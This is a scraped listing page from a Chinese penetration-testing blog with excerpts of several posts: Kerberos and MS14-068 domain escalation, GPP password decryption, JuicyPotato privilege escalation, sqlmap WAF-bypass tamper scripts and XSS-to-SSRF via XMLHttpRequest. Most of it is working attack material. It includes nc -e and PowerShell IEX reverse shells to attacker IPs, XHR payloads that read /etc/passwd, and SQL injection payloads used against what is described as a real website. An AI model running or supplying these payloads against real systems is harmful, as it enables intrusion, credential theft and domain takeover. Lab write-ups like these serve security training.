python smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
python wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass执行之前需要同步域控时间，否则会出现下列错误    sudo rdate 10.10.10.161

python psexec.py HTB.LOCAL/UserDoesnotExit@HTB.LOCAL -k -no-pass不能使用IP进行连接



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="域控提权之ms14-068" alt="域控提权之ms14-068" href="/2020/04/25/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8Bms14-068/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="域控提权之ms14-068" alt="域控提权之ms14-068"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; 域控提权之ms14-068 &gt;</div>
                            <div class="content flex1">
                                
  危害：任意域控用户都可以提权到域控一般为本地账户才能成功，但是使用klist purge清除缓存证书可绕过限制
一、漏洞成因在 KDC 对 PAC 进行验证时，根据协议规定必须是带有 server Hash、KDC Hash 的签名算法才可以（原本的设计是 HMAC 系列的 checksum 算法），但微软在实现上，却允许任意签名算法。只要客户端指定任意签名算法，KDC 就会使用指定的算法进行签名验证，致使导致恶意用户在发送给KDC的TG_REQ中可以创建包含管理员帐户成员身份的伪造PAC被KDC接收，并将其放入TG_REP中发布的新TGT票证中。该票证可用于向KDC要求服务票证的服务升级特权：在这种情况下，是smb服务票证。 
什么是PAC（特权帐户证书）：
PAC包含域控制器（DC）提供的授权数据，Active Directory将授权数据存储在PAC（特权帐户证书）的票证字段中。    PAC由DC在服务单的现场授权数据中提供。它用KDC密钥（只有AD知道）签名，并用要验证的服务和AD之间共享的服务密钥签名。
二、利用条件1.域控机器没有打漏洞补丁      补丁号：KB3011780
2.拥有一台域内机子及其sid三、漏洞利用漏洞检测：FindSMB2UpTime.py(但是这个并不一定准确，因为域控是一般不会重启，但是也有存在意外重启的情况，那么即使有ms14-068也不会显示)
./FindSMB2UPTime.py 192.168.31.220
DC is up since: 2013-12-28 22:24:25
This DC is vulnerable to MS14-068获取域控制器补丁状态:Get-DCPatchStatus.ps1
# This is an example script only.
import-module activedirectory
[string]$KBNumber = &quot;KB3011780&quot;
$DomainControllers = Get-ADDomainController -filter *
[int]$DomainControllersCount = $DomainControllers.Count
[int]$PatchedDCCount = 0
[int]$UnPatchedDCCount = 0
$UnpatchedDCs = @()
Write-Output &quot;Scanning $DomainControllersCount Domain Controllers for patch $KBNumber&quot;
ForEach ($DomainController in $DomainControllers)
{
    $DomainControllerHostName = $DomainController.HostName
    $PatchStatus = Get-HotFix -ID $KBNumber -ComputerName $DomainController.HostName -ErrorAction SilentlyContinue

    IF ($PatchStatus.InstalledOn)
        {
            $PatchStatusInstalledOn = $PatchStatus.InstalledOn
            Write-Output &quot;$DomainControllerHostName patched on $PatchStatusInstalledOn&quot;
            $PatchedDCCount++
        }
    Else
        {
            Write-Warning &quot;$DomainControllerHostName is NOT patched for $KBNumber (or could not be contacted)&quot;
            [array]$UnpatchedDCs += $DomainController.HostName
            $UnPatchedDCCount++
        }
}
Write-Output &quot;Out of $DomainControllersCount DCs, Patched: $PatchedDCCount &amp; UnPatched: $UnPatchedDCCount &quot;
IF ($UnpatchedDCs)
{
    Write-Output &quot;The following DCs are NOT patched for $KBNumber&quot;
    $UnpatchedDCs
}环境描述：
目标机器：10.10.10.52  Windows Server 2008 R2 Standard
已获取：DC上的一个普通本地账户

james用户账户密码


james sid （可通过多种途径获取rpclient：lookupnames james目标机器shell中：whoami /all ，）

攻击机：kali 10.10.14.14  （不在域中）
在Linux上：(没有目标shell的情况下)1.安装客户端，在客户端生成票证
sudo apt-get install krb5-user cifs-utils rdate2./etc/hosts中添加：（内网机器没有映射，所以需要添加）
10.10.10.52 htb.local htb mantis.htb.local  mantis3.编辑/etc/krb5.conf
[libdefaults]
    default_realm = HTB.LOCAL

[realms]
   HTB.LOCAL = {
    kdc = mantis.htb.local:88
    admin_server = mantis.htb.local
    default_domain = HTB.LOCAL
    }
[domain_realm]
    .domain.internal = HTB.LOCAL
    domain.internal = HTB.LOCAL4.添加路由：编辑/etc/resolve.conf
nameserver 10.10.10.525.同步域控时间（确定DC的时间（用于票证同步），按照RFC必须在5分钟内完成，但+ -30分钟的偏差也可以的）

[方法1]net time -S 10.10.10.52 -U“” ##获取DC时间，然后收到设置本机时间

[方法2]sudo rdate -n 10.10.10.52  ###直接同步到域控时间


6.为james用户生成一张新的Kerberos票证
kinit -V james@HTB.LOCAL       ###kinit中域名需要大写；或直接 kinit james
klist
此时生成的是jame是的票证：访问C$是没有权限的
kali@kali:~/tools/AD_Recon/pykek$ smbclient -W HTB.LOCAL //MANTIS/c$ -k
tree connect failed: NT_STATUS_ACCESS_DENIED7.ms14-068生成高权限TGT票证

8.替换低权限票证
mv TGT_james@HTB.LOCAL.ccache  /tmp/krb5cc_10009.smb成功登录C$

Mimikatz：先在目标机器使用ms14-068.exe生成票据，然后使用mimikatz注入票据，再使用psexec获取权限或winexec执行命令
ms14-068.py -u james@HTB.LOCAL -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis将TGT_james@HTB.LOCAL.ccache文件放入mimikatz目录中
mimikatz.exe log &quot;kerberos::ptc TGT_james@HTB.LOCAL.ccache&quot; exit注入成功即可获得域管理session，可以klist看一下是否有了kerberos Ticket
net use \\htb.local\admin$    ####使用IP可能会失败
dir \\htb.local\c$ 
psexec  \\htb.local  cmd.exe突破“本地账户才能漏洞利用”的限制：先 klist purgr清除缓存证书，再使用mimikatz生成高权限TGT的缓存证书进行连接原理：https://www.freebuf.com/vuls/56081.html
GoldenPac,py也有更简便的方法，不需要上边的种种配置，直接使用impacket套件下的GoldenPac一发入魂（ms14-068+psexec）




                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 25, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="Kerberos认证学习" alt="Kerberos认证学习" href="/2020/04/25/Kerberos%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="Kerberos认证学习" alt="Kerberos认证学习"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; Kerberos认证学习 &gt;</div>
                            <div class="content flex1">
                                
  Kerberos简介：

Kerberos来源于希腊神话中的三头犬、寓意着需要第三方（密钥分发中心）来进行通信，即KDC永远不会和Client所要请求的Server进行通信（工具人！！！）

几乎每次互动，都会收到两条消息（一个用于响应，另一个则用于请求下一个服务）

Kerberos非常依赖加密密钥，所有通信步骤中都用到共享密钥




1、AS-REQClient将用户密码转换成NTLM hash，使用该hash对时间戳进行加密;然后将纯文本形式的时间戳以及身份信息[你的名称/ID、请求的服务名称/ID(这里为TGS：Ticket Granting Server)]、TGT生存期等）发送给AS
2、AS-REPAS收到Client发送的身份信息，从KDC数据库中检索身份信息（只检查用户是否存在，而不检查用户凭据）。用户存在则生成一个随机的session key（会话密钥）[用于给Client请求TGS]    
AS向Clinet发送两条消息：        
消息1包含如下信息：[使用TGS SECRET KEY（同样存储在KDC数据库中）加密]—&gt;也就是使用TGS密钥加密TGT
步骤1中用户提供的信息+TGS SESSION KEY                
消息2包含如下信息：[使用用户密钥（也就是用户NTLM hash）加密]     
TGS名称/ID            
时间戳            
TGS SESSION KEY
TGT生存期`消息1为Client所请求的TGT，但是由于没有TGS SCRECT KEY,所以无法解密，此时TGT存储在Client凭据缓存中 消息2解密后获得TGS SESSION KEY
3、TGS-REQ(金票攻击发生在此步骤)
Client向TGS发送两条消息消息1：[使用TGS SESSION KEY进行加密]  
你的名称/ID
时间戳`消息2：[未加密消息]
所要请求服务的名称/ID
服务的有效生存期同时还会发送步骤2中收到的TGT。TGS收到Client信息，会先到KDC数据库中检查请求的服务是否存在
4、   TGS-REPTGS使用TGS SECRET KEY解密得到未加密的TGT，包含TGS SESSION KEY,TGS SESSION KEY解密Client消息中的加密信息解密之后，TGS对如下信息进行检查    
步骤3中消息1解密后得到的用户名称/ID与TGT的进行比较
步骤3中消息1解密后得到的时间戳与TGT中的进行比较（默认为2分钟
检查TGT是否过期
检查TGS缓存中是否已有该用户凭据，避免重播检查无误之后，同样向客户端发送两条消息
消息1：[生成的使用Service Secret Key加密后的TGS]—-&gt;Kerberos令牌
消息2：[TGS Session Key加密]    
服务名称/ID   
时间戳    
票据生存期    
Service Session Key5、AP-REQ银票攻击发生在此步骤
Client使用TGS SESSION KEY解密得到SERVER SESSION KEY,然后使用SERVER SESSION KEY加密如下消息：    
用户名称/ID
时间戳`该消息加密之后与和TGS一同发送给服务端服务端使用SERVER SECRET KEY解密TGS，验证完成，服务端允许Client在TGS中指定的时间内访问请求资源
6、AP-REP启用相互认证的情况下，交换时间戳进行相互认证



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 25, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="域内提权之滥用GGP" alt="域内提权之滥用GGP" href="/2020/04/25/%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E4%B9%8B%E6%BB%A5%E7%94%A8GGP/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="域内提权之滥用GGP" alt="域内提权之滥用GGP"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; 域内提权之滥用GGP &gt;</div>
                            <div class="content flex1">
                                
  在SYSVOL查找密码组策略首选项（GPP）中的密码
原理：什么是GPP
GPP被用来将通用的本地管理员密码应用于所有工作站、应用全新的管理员帐户、为其他用户安排任务、应用打印机等用途
一般域内机子较多的情况，管理员为了方便管理，在主机上设置本地管理员密码GPP。配置此功能后，会在域控制器上创建一个XML文件，其中包含将策略应用于连接到域的工作站或便携式计算机时配置帐户所需的信息。
该xml文件包含管理帐户的密码，一般情况下任意域用户都可以读取（通常是DC开启SYSVOL目录共享）
这里不得不提的一点是Microsoft已使用AES加密了xml文件中的密码以提高安全性，但又发布了用于加密和解密该值的密钥（所以这是什么操作？？？）
漏洞利用：连接到域控制器的默认SYSVOL共享，并在其中搜索groups.xml的实例。如果存在这些文件，它们将位于格式类似于以下的文件夹中：
\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml1、定位域控制器
set l   
nltest /DSGETDC:
echo %logonserver%
net time /domain
......2、查询DC共享目录使用enumlinux或者smbmap检查共享目录：
smbmap -H 10.10.10.100  ###列出目标用户共享列表
---- -----------
ADMIN$ NO ACCESS
C$ NO ACCESS
IPC$ NO ACCESS
NETLOGON NO ACCESS
replication read only   
SYSVOL NO ACCESS
Users NO ACCESS3、连接域共享
smbclient //active.htb/Replication -N
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\more Groups.xml
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;active.htb\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.htb\SVC_TGS&quot;/&gt;&lt;/User&gt;4、解密使用gpprefdecrypt.py： 
python gpprefdecrypt.pyedBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ


                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 25, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="JuicyPotato提权" alt="JuicyPotato提权" href="/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="JuicyPotato提权" alt="JuicyPotato提权"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; JuicyPotato提权 &gt;</div>
                            <div class="content flex1">
                                
  项目地址：https://github.com/ohpe/juicy-potato/
0x01、前言Juicy Potato是在工具RottenPotatoNG （ms16-075提权exe）的基础上的扩展，使用更方便，使用范围也更广
利用的前提是获得了SeImpersonate或者SeAssignPrimaryToken权限，通常在webshell下使用
whoami /pri   ##查找SeImpersonate and/or SeAssignPrimaryToken


0x02、JuicyPotato功能自主选择CLSID
-c ‘clsid’         #### clsid查找：http://ohpe.it/juicy-potato/CLSID/ 
自定义COM监听端口
-l : COM server listen port
COM监听地址
-m : COM server listen address (default 127.0.0.1)
进程创建模块 
-t createprocess call:  CreateProcessWithTokenW,  CreateProcessAsUser, &lt;*&gt; try both
执行指定进程或脚本
-p : program to launch
为指定的执行进程选择参数
-a : command line argument to pass to program (default NULL)
RPC服务地址
-k : RPC server ip address (default 127.0.0.1)
RPC服务端口：
-n : RPC server listen port (default 135)
支持测试模块；测试并查找clsid
-z only test CLSID and print token’s user
0x03、JuicyPotato使用依赖于clsid：PS C:\users\userpool\desktop&gt; ./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c whoami&quot; -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
COM -&gt; recv failed with error: 10038查找替换http://ohpe.it/juicy-potato/CLSID/  很幸运2012 Standard中的第一条就成功了：
./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;whoami&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;

反弹shell：./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c c:\users\userpool\desktop\nc.exe -e cmd.exe 10.10.14.14 4444&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;或者将paylaod写入bat，-p参数执行bat
echo &apos;C:\users\userpool\nc.exe -e cmd.exe 10.10.14.14 4444&apos; &gt; rev.bat
./juicypotato.exe  -l 1337 -p c:\users\userpool\desktop\rev.bat -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;RDP下提权：直接弹出一个system权限窗口
./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe  -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;0x04、CLSID快速验证[1]获取可用CLSID列表
提取CLSID Powershell脚本 GetCLSID.ps1
同级目录下需要有Join-Object.ps1
GetCLSID.ps1执行成功后生成文件CLSID.list和CLSID.csv(在windows对应版本的目录下，如Windows_Server_2012_R2_Datacenter)
Invoke-WebRequest -Uri http://10.10.14.14:8000/Join-Object.ps1 -outfile ./Join-Object.ps1
Invoke-WebRequest -Uri http://10.10.14.14:8000/GetCLSID.ps1 -outfile ./GetCLSID.ps1
powershell -ep bypass -f GetCLSID.ps1
##Get-Content GetCLSID.ps1 | PowerShell.exe -noprofile -枚举所有满足条件的CLSID:
New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null
$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N=&apos;CLSID&apos;; E={$_.pschildname}} | where-object {$_.appid -ne $null}
foreach($a in $CLSID)
{
Write-Host $a.CLSID
}[2]批处理调用juicypotato.exe逐个测试CLSID
test_clsid.bat:
@echo off
:: Starting port, you can change it
set /a port=10000
SETLOCAL ENABLEDELAYEDEXPANSION
FOR /F %%i IN (CLSID.list) DO (
   echo %%i !port!
   juicypotato.exe -z -l !port! -c %%i &gt;&gt; result.log
   set RET=!ERRORLEVEL!
   :: echo !RET!
   if &quot;!RET!&quot; == &quot;1&quot;  set /a port=port+1
)0x05、限制条件
需要支持SeImpersonate或者SeAssignPrimaryToken权限
开启DCOM
本地支持RPC或者远程服务器支持PRC并能成功登录
能够找到可用的COM对象

https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 22, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="一次注入实战引发的SQLMAP修改之路" alt="一次注入实战引发的SQLMAP修改之路" href="/2020/04/19/%E4%B8%80%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E5%BC%95%E5%8F%91%E7%9A%84SQLMAP%E4%BF%AE%E6%94%B9%E4%B9%8B%E8%B7%AF/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="一次注入实战引发的SQLMAP修改之路" alt="一次注入实战引发的SQLMAP修改之路"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; 一次注入实战引发的SQLMAP修改之路 &gt;</div>
                            <div class="content flex1">
                                
  首发于先知社区：https://xz.aliyun.com/t/6864
#一、    前言SQLmap的payload修改一般有两种方式:  1、编写tamper  2、修改/添加sqlmap的xml文件语句自定义payload
#二、    注入点Fuzz选中目标网站：http://www.xxxx.com/journals_desc.php?id=40单引号报错，对单引号进行转义，id=0=0测试回显正常，int型注入

Order by 猜字段值为7
Waf为Modsec，直接使用union select被拦截：

Fuzz：
单个union    #不拦截
单个select    #不拦截
Union select  #拦截
union /**/ select #拦截
/*!00000union*/ select #内联注释，不拦截
/*!50000union*/ select 1,2,3,4,5,6,7 
此处应该是涉及到强弱类型转换的问题，int为强类型，猜测对应的字段为弱类型解决方法：[1]使用string方法、但单引号’ 被被转义了,所以该方法行不通
[2]采用报错注入
#三、编写简单Tamper脚本绕过（使用自带的modsecurityzeroversioned.py不能绕过）
报错注入过程中，发现主要过滤关键词from和函数concat（）
1、concat()被过滤:concat()--&gt;concat/**/()  对应tamper脚本concat2concatcomment.py如下：
#!/usr/bin/env python2
&quot;&quot;&quot;
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file &apos;LICENSE&apos; for copying permission
&quot;&quot;&quot;
from lib.core.compat import xrange
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW
def dependencies():
pass
def tamper(payload, **kwargs):
return payload.replace(&quot;CONCAT&quot;,&quot;CONCAT/**/&quot;)2、from被过滤，from–&gt;/*!44144from*/对应tamper脚本from.py如下：
#!/usr/bin/env python2
&quot;&quot;&quot;
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file &apos;LICENSE&apos; for copying permission
&quot;&quot;&quot;
from lib.core.compat import xrange
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW
def dependencies():
pass
def tamper(payload, **kwargs):
return payload.replace(&quot;FROM&quot;,&quot;/*!44144FROM*/&quot;)验证：
python sqlmap.py -u &quot;https://www.xxxx.com/journals_desc.php?id=66&quot; --level 3 --risk 3 -v 3 --tamper=&quot;from,concat2concatcomment&quot; --force-ssl  --technique=E
--dbs读取（可以比对一下使用tamper脚本和使用tamper脚本后语句）payload in sqlmap:
1AND (SELECT 8403 &#x2F;*!44144FROM*&#x2F;(SELECT COUNT(*),CONCAT&#x2F;**&#x2F;(0x716b707071,(SELECT REPEAT(0x34,1024)),0x71627a7a71,FLOOR(RAND(0)*2))x &#x2F;*!44144FROM*&#x2F; INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

--tables读取，很遗憾，读取失败

再次把它的payload拿到本地测试，也是行不通的。语句很长，需要慢慢fuzz究竟是哪里被拦截、组合、函数、关键字？
但是，，，，坑的是竟然不是因为过滤引起的？？？？
#四、修改SQLmap的xml文件语句实在不行了，去用手工注了出来，但是用SQLmap就是跑不出来？？？再去看一下SQLmap的payload是不是有问题，咋一看没什么大问题，所以我一开始也忽略了，卡了好久。也就是这里涉及到了直接修改SQLmap自带的语句。大家自行比较一下下面这两条语句看看能不能看出问题~1、
https://www.xxxx.com/journals_desc.php?id=40%20and%20updatexml/**/(1,concat/**//**/(0x7e,(select%20DISTINCT%20GROUP_CONCAT(table_name)/*!44144from*/%20%20%20information_schema.TABLES%20where%20table_schema=database())%20),1)2、
https://www.xxxx.com/journals_desc.php?id=40%20and%20updatexml/**/(1,concat/**//**/(0x7e,(select%20DISTINCT%20GROUP_CONCAT(table_name)/*!44144from*/%20%20%20information_schema.`TABLES`%20where%20table_schema=database())%20),1)下面讲几个概念
[1]table和colums在mysql中是特殊字符
[2]反引号是sql语言的转义字符
[3]在mysql中的sql语句为了避免与系统冲突给表名加上反引号  ，（但在指定其他数据库时不能加，否则会被认作是表）
我们可以看到这里sqlmap的payload,对于information_schema.tables中的tables并没有加反引号,指引到/xml/queries.xml
information_schema.tables --&gt; information_schema.`tables`当然，columns也需要修改
information_schema.columns --&gt; information_schema.`columns`修改之后跑表：
python sqlmap.py -u &quot;https://www.xxxx.com/journals_desc.php?id=66&quot; --level 3 --risk 3 -v 3 --tamper=&quot;from,concat2concatcomment&quot;   --technique=E   -D mililink_main --tablespayload in sqlamp（比对一下payload，看看效果）:
66 AND (SELECT 9571 /*!44144FROM*/(SELECT COUNT(*),CONCAT/**/(0x716b7a6b71,(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,54) /*!44144FROM*/ INFORMATION_SCHEMA.`TABLES` WHERE table_schema IN (0x6d696c696c696e6b5f6d61696e) LIMIT 15,1),0x7171767071,FLOOR(RAND(0)*2))x /*!44144FROM*/ INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
跑列值也是一样的，就不多说了，直接上图

#五、关于SQLmap自定义payload的一些思考SQLmap的payload修改，其实并不复杂。
tamper脚本的编写，可以参考上边的from.py和concat2concatcomment.py，它其实是有固定格式的。简单的自定义paylaod只需要在def tamper(payload, **kwargs)函数中写入替换语句即可。可参考https://payloads.online/archivers/2017-06-08/1
修改/添加sqlmap的xml文件语句来自定义payload。需要找到对应的xml文件，然后修改xml文件中的语句。    查询语句在\sqlmap\data\xml\ queries.xml定义，若想自定义查询语句则只需要修改/添加想要执行的查询语句即可，如上边对INFORMATION_SCHEMA.TABLES的修改不同的注入方式使用的语句则需要在对应的注入方式中的xml语句进行修改，在\sqlmap\data\xml\payloads\文件下

假若我们需要修改error-base注入方式的payload，则需要在/xml/payload/error_based.xml中修改



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 19, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="从两道靶场题目看XHR" alt="从两道靶场题目看XHR" href="/2020/04/19/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%9D%B6%E5%9C%BA%E9%A2%98%E7%9B%AE%E7%9C%8BXHR/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
                                <img title="从两道靶场题目看XHR" alt="从两道靶场题目看XHR"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; 从两道靶场题目看XHR &gt;</div>
                            <div class="content flex1">
                                
  首发于先知社区：https://xz.aliyun.com/t/7473/
#0x01、什么是XHRXHR，也就是XMLHttpRequest，是现代浏览器都有的一个内置对象，使用 XMLHttpRequest对象可以与服务器交互。无需刷新整个页面即可从URL获取数据，允许网页在不影响用户的操作的情况下更新页面的局部内容，多应用于 AJAX 编程中。
特别注意的是XMLHttpRequest 可以用于获取任何类型的数据，而不仅仅是XML，它甚至支持 HTTP 以外的协议（包括 file:// 和 FTP）
#0x02、利用一：读取本地文件
适用于XSS打到后台管理员，以普通用户身份构造payload发送给管理员，登录后台触发payload并查看回显（也就是拿到cookie能够登录后台的情况）
以Hackthebox的book靶场为例：
情景描述：普通用户能够上传pdf文件，且能够自定义Title和Author，管理员能够下载用户上传的pdf；登录管理员发现Title字段插入的xss解析并显示在管理员能够看到的pdf标题中

验证：Title字段插入内容更改为
1&lt;script&gt;document.write(Date());&lt;/script&gt;

进一步利用：利用XHR读取本地文件
本来直接想到的是在浏览器本地同源的情况下file协议读取：&lt;利用iframe的file协议&gt;
&lt;iframe src=&quot;file:///etc/passwd&quot;&gt;&lt;/iframe&gt;
没有回显
&lt;script&gt;document.write(&apos;&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;&apos;)&lt;/script&gt;还是没有回显
姿势不够，直接使用iframe插入paylaod没有回显，但是说明了可以使用file协议，尝试使用XHR发送Ajax请求并利用File协议读取：
&lt;script&gt;
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);
x.send();
 &lt;/script&gt;Tips：由于这里对Title内容没有字数限制，所以我直接插入完整paylaod，有字数限制的情况下可以写入js文件中，后面会讲到

同样的方法可以直接读取到该服务器的用户ssh私钥进行登录
#0x03、利用二：由XSS到SSRF之命令执行
这个条件比较苛刻，需要有命令执行，但是对执行者的IP进行验证，这里以HackTheBox的Bankrobber中的例子为例
情景描述：页面端有个backdoorchecker.php页面，能够执行dir命令(限制不严，很简单就绕过)，但是只允许本地执行，直接看代码（通过SQL注入已读取到源码）

简易思路:现有XSS，尝试结合XMLHttpRequest借用本地账户进行操作：借用管理员身份打开backerdoorchecker.php绕过IP限制（即转换成SSRF），并构造payload绕过命令执行限制
漏洞利用：借助smb执行我们攻击机上的nc反弹shell （smb服务可以借助impacket套件中的smbserver.py快速搭建）Payload：
&lt;script&gt; var x = new XMLHttpRequest(); x.open(&quot;POST&quot;, &quot;backdoorchecker.php&quot;, true); x.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;); x.send(&apos;cmd=dir xxx || \\\\10.10.16.21\\ica\\nc.exe -e cmd.exe 10.10.16.21 9999&apos;);&lt;/script&gt;nc -lvvp 9999 即可回弹shell
#0x04、一点小小扩展这里可以把payload写到js文件中，然后插入我们的js文件即可，关于如何编写XHR的js文件的链接会放到文末。这里针对利用二，还有另外的利用方式，即通过powershell IEX下载脚本并反弹PowerShellTcp.ps1并反弹。既然提到了js文件的方式，就以这种方式构造payload：XSS框直接插入：    
Reverse.js文件内容如下：
function paintfunc(){
 var http = new XMLHttpRequest();
     var url = &apos;http://localhost/admin/backdoorchecker.php&apos;;
     var params = &apos;cmd=dir| powershell -c &quot;iex (New-Object Net.WebClient).DownloadString(\&apos;http://10.10.16.21:8000/Invoke-PowerShellTcp.ps1\&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.21 -Port 9969&quot;&apos;;
     http.open(&apos;POST&apos;, url, true);
     http.setRequestHeader(&apos;Content-type&apos;, &apos;application/x-www-form-urlencoded&apos;);
     http.send(params);
}
paintfunc();#0x05、题后话1）、关于XSS结合XHR还有更多利用，如不能登录后台的情况下添加管理员等
2）、关于iframe没有回显的问题：这是由于iframe是通过浏览器本地同源来进行加载文件的，即不能通过网络加载，我们简单做个测试：创建iframe.html,写入如下语句
&lt;iframe src=&quot;file:///F:/password.txt&quot;&gt;&lt;/iframe&gt;直接在本地直接打开

放到网站目录下通过浏览器访问：

链接：
https://www.w3schools.com/xml/xml_http.asp 
http://heartsky.info/2017/08/30/%E6%B5%85%E8%B0%88-XSS-%E5%8F%91%E9%80%81%E5%A4%96%E5%9F%9F%E8%AF%B7%E6%B1%82/
https://blog.0daylabs.com/2014/11/01/xss-ex-filtrating-data-xmlhttprequest-js-pentesters-task-15-write/



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 19, 2020</span>
                            </div>
                        </div>
                    </a>
                
                    <a title="multi-ways-file-download" alt="multi-ways-file-download" href="/2020/04/19/multi-ways-file-download/"
                       class="post-item swiper-slide flex flex-v">
                        <div class="image">
                            
